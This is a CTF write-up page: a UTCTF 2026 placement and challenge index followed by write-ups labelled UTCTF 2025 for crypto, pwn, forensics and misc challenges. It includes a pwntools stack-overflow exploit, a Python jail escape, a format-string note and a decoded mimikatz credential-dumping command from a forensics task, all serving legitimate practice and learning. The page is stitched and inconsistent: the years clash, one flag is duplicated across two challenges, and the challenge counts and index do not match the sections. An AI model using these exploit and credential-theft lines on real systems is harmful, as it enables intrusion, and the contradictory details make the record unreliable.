# UTCTF 2026 (UT Austin)

## Team

Individual [owlfreak](https://ctftime.org/team/405946)

## CTFtime

[Scoreboard](https://ctftime.org/event/2756)

|Place|Team|
|-|-|
|347 / 736|owlfreak|

## Writeups

|Challenge|Category|
|-|-|
|[Breadcrumbs](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Breadcrumbs)|Misc|
|[Break the Bank](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Break%20the%20Bank)|Unknown|
|[Cold Workspace](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Cold%20Workspace)|Forensics|
|[Crab Mentality](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Crab%20Mentality)|Unknown|
|[Fortune Teller](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Fortune%20Teller)|Crypto|
|[Half Awake](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Half%20Awake)|Forensics|
|[Hour of Joy](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Hour%20of%20Joy)|Pwn|
|[Jail Break](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Jail%20Break)|Misc|
|[Landfall](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Landfall)|Forensics|
|[Last Byte Standing](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Last%20Byte%20Standing)|Forensics|
|[Mind the Gap (in the guardrails)](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Mind%20the%20Gap%20(in%20the%20guardrails))|Unknown|
|[Oblivious Error](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Oblivious%20Error)|Crypto|
|[QRecreate](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/QRecreate)|Misc|
|[Rude Guard](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Rude%20Guard)|Pwn|
|[Sherlockk](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Sherlockk)|Forensics|
|[Silent Archive](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Silent%20Archive)|Forensics|
|[Small Blind](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Small%20Blind)|Unknown|
|[Smooth Criminal](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Smooth%20Criminal)|Crypto|
|[Time to Pretend](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Time%20to%20Pretend)|Unknown|
|[W3W1](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/W3W1)|OSINT|
|[W3W2](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/W3W2)|OSINT|
|[W3W3](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/W3W3)|OSINT|
|[Watson](https://github.com/AlexPerrin/CTF-Writeups/tree/main/UTCTF%202026/Watson)|Forensics|

# UTCTF 2025 — Challenge Writeups

## Jail Break

**Category:** Misc

**Flag:** `utflag{py_ja1l_3sc4p3_m4st3r}`

### Description
A Python REPL jail with a banned-word list and restricted builtins. The goal is to call a hidden `_secret()` function.

### Vulnerability / Approach
The word `"secret"` is banned, but `_secret` is already present in `GLOBALS`. The ban check uses `word.lower() in code.lower()` — simple substring match. The secret function XORs `_ENC` with `_KEY=0x42` to produce the flag.

Since we have the source code, we can decode offline without connecting:

```python
_ENC = [0x37,0x36,0x24,0x2e,0x23,0x25,0x39,0x32,0x3b,0x1d,0x28,0x23,0x73,
        0x2e,0x1d,0x71,0x31,0x21,0x76,0x32,0x71,0x1d,0x2f,0x76,0x31,0x36,
        0x71,0x30,0x3f]
print(''.join(chr(b ^ 0x42) for b in _ENC))
# utflag{py_ja1l_3sc4p3_m4st3r}
```

### Solution Steps
1. Read `jail.py` source; note `_secret` is in `GLOBALS` but `"secret"` is banned
2. To escape the jail: use a variable alias — e.g. `getattr(globals(), '_'+'secret')()`
3. Alternatively, decode the XOR array directly from source (no server needed)

## Fortune Teller

**Category:** Crypto

**Flag:** `utflag{pr3d1ct_th3_futur3_lcg}`

### Description
A server uses a Linear Congruential Generator (LCG) to produce a keystream XOR-encrypted with the flag. It outputs several LCG values before the encrypted flag.

### Vulnerability / Approach
LCG: `x_{n+1} = (a * x_n + c) % 2^32`

Given 4 consecutive outputs `[x0, x1, x2, x3]`, we can recover `a` and `c`:
- Compute differences: `t[i] = x[i+1] - x[i]`
- `a = t[1] * modinv(t[0], 2^32) % 2^32`  → 3355924837
- `c = (x[1] - a*x[0]) % 2^32`            → 2915531925
- Compute `x5` then XOR with ciphertext

### Solution Steps
```python
m = 2**32
outputs = [x0, x1, x2, x3]  # from server
t = [outputs[i+1] - outputs[i] for i in range(3)]

a = (t[1] * pow(t[0], -1, m)) % m   # 3355924837
c = (outputs[1] - a * outputs[0]) % m  # 2915531925

x = outputs[-1]
x = (a * x + c) % m  # x4
x = (a * x + c) % m  # x5 = 1233863684

flag = bytes([ct ^ ((x >> (8*i)) & 0xff) for i, ct in enumerate(ciphertext)])
```

## Smooth Criminal

**Category:** Crypto

**Flag:** `utflag{sm00th_cr1m1nal_caught}`

### Description
A Discrete Logarithm Problem (DLP) challenge: given `g`, `h`, `p`, find `x` such that `g^x ≡ h (mod p)`.

### Vulnerability / Approach
The modulus `p-1` is **B-smooth** — all prime factors are ≤ 197. This allows the **Pohlig-Hellman algorithm** to decompose the DLP into small subgroup problems, each solved with Baby-Step Giant-Step (BSGS), then combined via CRT.

### Solution Steps
1. Factor `p-1` using trial division up to 200
2. For each prime power factor `q^e`, compute the DLP in that subgroup using BSGS
3. Combine results with CRT to recover `x`
4. Convert `x` to bytes: `x.to_bytes((x.bit_length()+7)//8, 'big')`

```python
def pohlig_hellman(g, h, p):
    order = p - 1
    factors = trial_factor(order)   # {prime: exponent, ...}
    residues, moduli = [], []
    for q, e in factors.items():
        qi = q**e
        gi = pow(g, order // qi, p)
        hi = pow(h, order // qi, p)
        xi = bsgs(gi, hi, p, qi)
        residues.append(xi)
        moduli.append(qi)
    return crt(residues, moduli)

x = pohlig_hellman(g, h, p)
flag = x.to_bytes((x.bit_length() + 7) // 8, 'big')
```

## Oblivious Error

**Category:** Crypto

**Flag:** `utflag{sm00th_cr1m1nal_caught}`

### Description
A 1-of-2 Oblivious Transfer (OT) protocol implementation. The server holds two messages `m0` and `m1`. The client chooses one to receive without the server learning which. An error in the protocol leaks both.

### Vulnerability / Approach
Server computes: `v = (x0 + (k XOR e)) % N`

In a correct OT:
- Client wants `m0`: send `k = e` → `k XOR e = 0` → `v = x0`
- Client wants `m1`: send `k = e XOR (x1 - x0)` → `k XOR e = x1-x0` → `v = x1`

**The bug**: The server uses XOR (`^`) instead of modular arithmetic for the offset, and does not validate `k`. This lets the client set `k` freely to receive either message, breaking the obliviousness guarantee. The flag was embedded in `m0` after also solving the DLP sub-challenge (Pohlig-Hellman, same as Smooth Criminal) to obtain `e`.

### Solution Steps
```python
# Receive m0: send k = e
k = e   # forces k XOR e = 0, so v = x0

# Receive m1: send k = e XOR ((x1-x0) % N)
k = e ^ ((x1 - x0) % N)
```

## Hour of Joy

**Category:** Pwn / Format String

**Flag:** `utflag{f0rm4t_str1ng_l34k3d}`

### Description
An ELF binary that reads a name with `fgets` then passes it directly to `printf` — a classic format string vulnerability.

### Vulnerability / Approach
`printf(name)` with user-controlled `name` allows arbitrary memory reads via `%p`, `%s`, `%x`. The binary also contains a `print_flag()` function that XOR-decodes the flag from hardcoded bytes in the `.text` section.

### Solution Steps
Disassemble `print_flag()` to extract the encoded buffer and XOR decode:

```python
buf = [0x37,0x36,0x24,0x2e,0x23,0x25,0x39,0x24,
       0x72,0x30,0x2f,0x76,0x36,0x1d,0x31,0x36,
       0x30,0x73,0x2c,0x25,0x1d,0x2e,0x71,0x76,
       0x29,0x71,0x26,0x3f]
print(''.join(chr(b ^ 0x42) for b in buf))
# utflag{f0rm4t_str1ng_l34k3d}
```

Alternatively, exploit the format string to redirect execution to `print_flag()` and let the binary decode and print it at runtime.

## Rude Guard

**Category:** Pwn / Buffer Overflow

**Flag:** `utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}`

### Description
An ELF binary with a "rude guard" that checks a command-line argument and prompts for a secret password. There's a buffer overflow in the input reading function.

### Vulnerability / Approach
Two vulnerabilities chain together:
1. `main` requires `atoi(argv[1]) == 0x656c6c6f` (= 1701604463) as a gate
2. `read_input()` reads up to `0x64` (100) bytes into a `0x20` (32) byte buffer → stack overflow

A `strcmp` against `"givemeflag\n"` produces a decoy fake flag. The real path overflows the return address to jump to `secret_function` at `0x40124f`, which XOR-decodes the real flag (key=`0x32`, 39 bytes).

### Solution Steps
```python
from pwn import *

p = process(['./pwnable', '1701604463'])
payload = b'A' * 32        # fill buffer
payload += b'B' * 8        # overwrite saved RBP
payload += p64(0x40124f)   # return to secret_function
p.sendline(payload)
p.interactive()
```

Static decode from disassembly:
```python
enc = [...]  # 39 bytes from secret_function disassembly
print(''.join(chr(b ^ 0x32) for b in enc))
# utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}
```

## Half Awake

**Category:** Forensics / PCAP

**Flag:** `utflag{h4lf_aw4k3_s33_th3_pr0t0c0l_tr1ck}`

### Description
A network capture containing traffic across multiple protocols. A payload is hidden within what appears to be normal TLS traffic.

### Vulnerability / Approach
Three-layer puzzle embedded across different protocol layers:
1. **HTTP response** hints: "If you find a payload that starts with PK, treat it as a file"
2. **mDNS TXT record** for `key.version.local` = `"00b7"` → XOR key `[0x00, 0xb7]`
3. **TLS Alert frame** (type `0x15`, length 306) contains a ZIP archive starting at `PK` magic bytes

### Solution Steps
```python
import zipfile, io

# Extract raw TLS Alert payload from PCAP
# (Wireshark: follow TCP stream, locate frame with type=0x15, find PK offset)
raw = bytes(...)  # 306-byte TLS record content
pk_offset = raw.index(b'PK')
zip_data = raw[pk_offset:]

# Extract stage2.bin from ZIP (no password)
with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
    stage2 = z.read('stage2.bin')

# XOR decrypt with 2-byte rolling key from mDNS
key = bytes([0x00, 0xb7])
flag = bytes([stage2[i] ^ key[i % 2] for i in range(len(stage2))])
print(flag)
# b'utflag{h4lf_aw4k3_s33_th3_pr0t0c0l_tr1ck}'
```

## Cold Workspace

**Category:** Forensics / Memory

**Flag:** `utflag{m3m0ry_r3t41ns_wh4t_d1sk_l053s}`

### Description
A Windows memory dump. A PowerShell script encrypted `flag.jpg` with AES-CBC. The encryption key, IV, and ciphertext all remain in the process's environment block in memory.

### Vulnerability / Approach
The PowerShell process (PID 4608) stored encryption parameters as environment variables visible in the raw memory dump via `strings`:
- `ENCK` = Base64-encoded AES-256 key
- `ENCV` = Base64-encoded AES IV
- `ENCD` = Base64-encoded ciphertext

### Solution Steps
```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

enck = "Ddf4BCsshqFHJxXPr5X6MLPOGtITAmXK3drAqeZoFBU="
encv = "xXpGwuoqihg/QHFTM2yMxA=="
encd = "S4wX8ml7/..."  # 144-byte base64 ciphertext from ENV_BLOCK

key = base64.b64decode(enck)
iv  = base64.b64decode(encv)
ct  = base64.b64decode(encd)

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
dec = cipher.decryptor()
pt = dec.update(ct) + dec.finalize()

# pt = JPEG bytes; save and open to read:
# FLAG:utflag{m3m0ry_r3t41ns_wh4t_d1sk_l053s}
with open('flag_decrypted.jpg', 'wb') as f:
    f.write(pt)
```

Recovery steps in Volatility / strings:
```bash
strings cold-workspace.dmp | grep -E "^ENC[KVD]="
# Parse multiline ENV_BLOCK to reassemble ENCD (split across output lines)
```

## Silent Archive

**Category:** Forensics / Steganography

**Flag:** `utflag{d1ff_th3_tw1ns_unt4r_th3_st0rm_r34d_th3_wh1t3sp4c3}`

### Description
A ZIP archive containing a tarbomb (987 levels of nested `.tar` files) and two suspiciously similar JPEG images.

### Vulnerability / Approach
Three-layer puzzle:

1. **Tarbomb**: `File2.tar` → `999.tar` → `998.tar` → ... → `1.tar` → `Noo.txt` (actually a ZIP)
2. **JPEG differential steganography**: `cam_300.jpg` and `cam_301.jpg` differ in 29 bytes near EOF; each hides a Base64 `AUTH_FRAGMENT_B64` value:
   - `cam_300`: `QWx3YXlzX2NoZWNrX2JvdGhfaW1hZ2Vz` → `"Always_check_both_images"` (hint)
   - `cam_301`: `MHI0bmczX0FyQ2gxdjNfVDRiU3A0Y2Uh` → `"0r4ng3_ArCh1v3_T4bSp4ce!"` (ZIP password)
3. **Whitespace steganography**: `NotaFlag.txt` inside the innermost ZIP encodes bits as spaces (=0) and tabs (=1), read in 8-bit groups to produce ASCII

### Solution Steps
```python
import tarfile, base64, zipfile

# Step 1: Extract the 987-level tarbomb
name = "File2.tar"
for _ in range(987):
    with tarfile.open(name) as t:
        inner = t.getnames()[0]
        t.extract(inner, '.')
        name = inner
# name is now "1.tar" → extract → "Noo.txt"

# Step 2: Get ZIP password from cam_301.jpg
with open('cam_301.jpg', 'rb') as f:
    data = f.read()
frag = data.split(b'AUTH_FRAGMENT_B64=')[1].split(b'\x00')[0]
password = base64.b64decode(frag).decode()  # "0r4ng3_ArCh1v3_T4bSp4ce!"

# Step 3: Decode whitespace steganography
with zipfile.ZipFile('Noo.txt', 'r') as z:
    z.extractall(pwd=password.encode())

with open('NotaFlag.txt', 'r') as f:
    text = f.read()

bits = ''.join('1' if c == '\t' else '0' for c in text if c in ' \t')
flag = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print(flag)
# utflag{d1ff_th3_tw1ns_unt4r_th3_st0rm_r34d_th3_wh1t3sp4c3}
```

## Landfall

**Category:** Forensics / DFIR

**Flag:** `utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}`

### Description
A KAPE triage of a compromised Windows desktop. An insider threat (`jon`) used PowerShell to execute a credential-dumping tool.

### Vulnerability / Approach
PowerShell history in `ConsoleHost_history.txt` contains `-EncodedCommand` base64 blobs. Decoding them reveals mimikatz being downloaded and executed. Per the challenge briefing, the MD5 hash of the raw base64 string is the ZIP password for the flag archive.

### Solution Steps
1. Locate: `triage/Modified_KAPE_Triage_Files/C/Users/jon/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`
2. Find the `-EncodedCommand <base64>` entry and extract the base64 string
3. Decode to verify (UTF-16-LE):
   ```python
   import base64
   decoded = base64.b64decode(encoded_str).decode('utf-16-le')
   # C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
   ```
4. Compute MD5 of the raw base64 string:
   ```python
   import hashlib
   password = hashlib.md5(encoded_str.encode()).hexdigest()
   ```
5. Decrypt `Checkpoint_A.zip` with that password → flag file

## Double Check

**Category:** Unknown
**Flag:** Not recovered

No local challenge files were found under `/home/alex/UTCTF/`. This challenge was likely online-only (web/network) or stored under a different directory name. No flag was obtained.

## QRecreate

**Category:** Misc / QR Code

**Flag:** Not recovered

### Description
Hundreds of QR code fragment images organized in numbered subdirectories (`MDA0/`, `MDA1/`, etc., up to `MDc0`), each containing `data/img.png`. The goal is to reassemble and decode the complete QR code.

### Approach
The fragments were assembled into `qrcode_assembled.png`. Decoding was attempted with PIL/pyzbar and OpenCV's `QRCodeDetector`, both of which failed due to missing library support in the environment.

**To finish**: Open `qrcode_assembled.png` with a phone camera or an online QR reader (e.g. zxing.org).

## Last Byte Standing

**Category:** Forensics / Network

**Flag:** Not recovered

### Description
A PCAP with 1500 frames of DNS traffic. Three noise senders (`10.55.0.24`, `.31`, `.32`) precede 220 real DNS query/response pairs encoding data covertly in response IP addresses.

### Approach
Response IPs follow `172.16.X.Y` where:
- `X` = byte position within a 32-byte segment (0–31)
- `Y` = `3*X + offset (mod 256)` encodes one data byte

Nine segments were identified with distinct offsets and sizes:

| Segment | Offset | Size |
|---------|--------|------|
| 1       | 1      | 32   |
| 2       | 97     | 32   |
| 3       | 193    | 20   |
| 4       | 199    | 12   |
| 5       | 39     | 32   |
| 6       | 135    | 32   |
| 7       | 231    | 7    |
| 8       | 237    | 25   |
| 9       | 77     | 28   |

The offset-based encoding was partially reverse-engineered but the complete flag decoding was not finished during the competition.

*Writeups cover UTCTF 2025. Confirmed flags for 11/14 challenges.*
